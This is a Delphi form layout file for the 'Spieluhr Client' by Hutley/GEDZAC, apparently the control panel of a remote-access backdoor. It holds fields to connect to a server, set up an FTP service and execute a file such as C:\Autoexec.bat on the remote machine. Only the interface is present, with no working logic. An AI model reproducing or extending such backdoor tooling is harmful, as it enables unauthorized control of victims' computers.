object Form1: TForm1
  Left = 192
  Top = 114
  BorderIcons = [biSystemMenu, biMinimize]
  BorderStyle = bsSingle
  Caption = 'Spieluhr Client v1.0 by Hutley/GEDZAC'
  ClientHeight = 313
  ClientWidth = 353
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'MS Sans Serif'
  Font.Style = []
  OldCreateOrder = False
  Position = poScreenCenter
  PixelsPerInch = 96
  TextHeight = 13
  object btnClose: TSpeedButton
    Left = 272
    Top = 274
    Width = 73
    Height = 17
    Caption = '# CLOSE #'
    Flat = True
    Font.Charset = ANSI_CHARSET
    Font.Color = clBlack
    Font.Height = -9
    Font.Name = 'Small Fonts'
    Font.Style = [fsBold]
    ParentFont = False
    OnClick = btnCloseClick
  end
  object lblLink: TLabel
    Left = 8
    Top = 274
    Width = 168
    Height = 15
    Cursor = crHandPoint
    Hint = 'Visit my web page!'
    Caption = 'http://Hutley.cjb.net'
    Font.Charset = ANSI_CHARSET
    Font.Color = clGreen
    Font.Height = -11
    Font.Name = 'Fixedsys'
    Font.Style = []
    ParentFont = False
    ParentShowHint = False
    ShowHint = True
    OnClick = lblLinkClick
    OnMouseEnter = lblLinkMouseEnter
    OnMouseLeave = lblLinkMouseLeave
  end
  object btnAbout: TSpeedButton
    Left = 192
    Top = 274
    Width = 73
    Height = 17
    Caption = 'ABOUT'
    Flat = True
    Font.Charset = ANSI_CHARSET
    Font.Color = clWindowText
    Font.Height = -9
    Font.Name = 'Small Fonts'
    Font.Style = [fsBold]
    ParentFont = False
    OnClick = btnAboutClick
  end
  object GroupBox1: TGroupBox
    Left = 8
    Top = 80
    Width = 337
    Height = 89
    Caption = 'FTP Server'
    TabOrder = 0
    object Label1: TLabel
      Left = 8
      Top = 27
      Width = 49
      Height = 13
      Caption = 'username:'
    end
    object Label2: TLabel
      Left = 8
      Top = 51
      Width = 48
      Height = 13
      Caption = 'password:'
    end
    object Label3: TLabel
      Left = 232
      Top = 16
      Width = 87
      Height = 13
      Caption = 'port: (default is 25)'
    end
    object btnApply: TSpeedButton
      Left = 232
      Top = 64
      Width = 89
      Height = 17
      Caption = 'apply changes'
      Flat = True
      Font.Charset = ANSI_CHARSET
      Font.Color = clBlack
      Font.Height = -9
      Font.Name = 'Small Fonts'
      Font.Style = [fsBold]
      ParentFont = False
      OnClick = btnApplyClick
    end
    object edtFTPUsername: TEdit
      Left = 64
      Top = 24
      Width = 121
      Height = 21
      TabOrder = 0
      Text = 'hutleyvx'
    end
    object edtFTPPassword: TEdit
      Left = 64
      Top = 48
      Width = 121
      Height = 21
      TabOrder = 1
      Text = '123456'
    end
    object edtFTPPort: TEdit
      Left = 248
      Top = 32
      Width = 57
      Height = 21
      MaxLength = 4
      TabOrder = 2
      Text = '25'
    end
  end
  object GroupBox2: TGroupBox
    Left = 8
    Top = 184
    Width = 337
    Height = 81
    Caption = 'Files'
    TabOrder = 1
    object Label4: TLabel
      Left = 8
      Top = 24
      Width = 75
      Height = 13
      Caption = 'execute the file:'
    end
    object btnExecute: TSpeedButton
      Left = 280
      Top = 40
      Width = 49
      Height = 22
      Caption = 'execute'
      Flat = True
      Font.Charset = ANSI_CHARSET
      Font.Color = clBlack
      Font.Height = -9
      Font.Name = 'Small Fonts'
      Font.Style = [fsBold]
      ParentFont = False
      OnClick = btnExecuteClick
    end
    object edtFile: TEdit
      Left = 8
      Top = 40
      Width = 265
      Height = 21
      TabOrder = 0
      Text = 'C:\Autoexec.bat'
    end
  end
  object StatusBar1: TStatusBar
    Left = 0
    Top = 294
    Width = 353
    Height = 19
    Panels = <
      item
        Text = '*** Not Connected'
        Width = 50
      end>
    SimplePanel = False
  end
  object GroupBox3: TGroupBox
    Left = 8
    Top = 8
    Width = 337
    Height = 57
    Caption = 'Server Connect'
    TabOrder = 3
    object Label5: TLabel
      Left = 8
      Top = 28
      Width = 11
      Height = 13
      Caption = 'ip:'
    end
    object Label6: TLabel
      Left = 144
      Top = 27
      Width = 21
      Height = 13
      Caption = 'port:'
    end
    object btnConnect: TSpeedButton
      Left = 248
      Top = 24
      Width = 65
      Height = 22
      Caption = 'connect'
      Flat = True
      Font.Charset = ANSI_CHARSET
      Font.Color = clBlack
      Font.Height = -9
      Font.Name = 'Small Fonts'
      Font.Style = [fsBold]
      ParentFont = False
      OnClick = btnConnectClick
    end
    object edtIP: TEdit
      Left = 24
      Top = 24
      Width = 97
      Height = 21
      TabOrder = 0
      Text = '225.225.225.225'
    end
    object edtPort: TEdit
      Left = 168
      Top = 24
      Width = 41
      Height = 21
      TabOrder = 1
      Text = '2707'
    end
  end
  object clSocket: TClientSocket
    Active = False
    ClientType = ctNonBlocking
    Port = 0
    OnConnecting = clSocketConnecting
    OnConnect = clSocketConnect
    OnDisconnect = clSocketDisconnect
    OnError = clSocketError
    Left = 320
  end
end
